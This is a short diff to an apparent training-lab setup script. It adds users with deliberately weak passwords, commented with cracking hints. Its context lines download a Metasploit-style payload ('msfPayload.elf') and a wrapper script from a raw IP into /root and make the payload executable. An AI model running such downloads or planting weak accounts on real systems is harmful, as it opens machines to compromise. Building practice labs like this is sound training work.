@@ -77,6 +77,8 @@ service guacd start
 useradd joshua -p password # wordlist, simple
 useradd alyssa -p afccdeg8 # brute-force, matches ?l?l?l?l?l?l?l?d, easy match
 useradd rajj -p 123mango # wordlist, end of rockyou
+useradd jamie -p morecats # wordlist, end of password.lst
+useradd maurice -p hello!? # brute-force, matches ?l?l?l?l?l?s?s
 wget "http://64.227.19.44/content/dlj23jjoj233jjajdeqo/msfPayload.elf" -O /root/msfPayload.elf
 chmod +x /root/msfPayload.elf
 wget "http://64.227.19.44/content/dlj23jjoj233jjajdeqo/linuxWrapperMSF.sh" -O /root/linuxWrapperMSF.sh
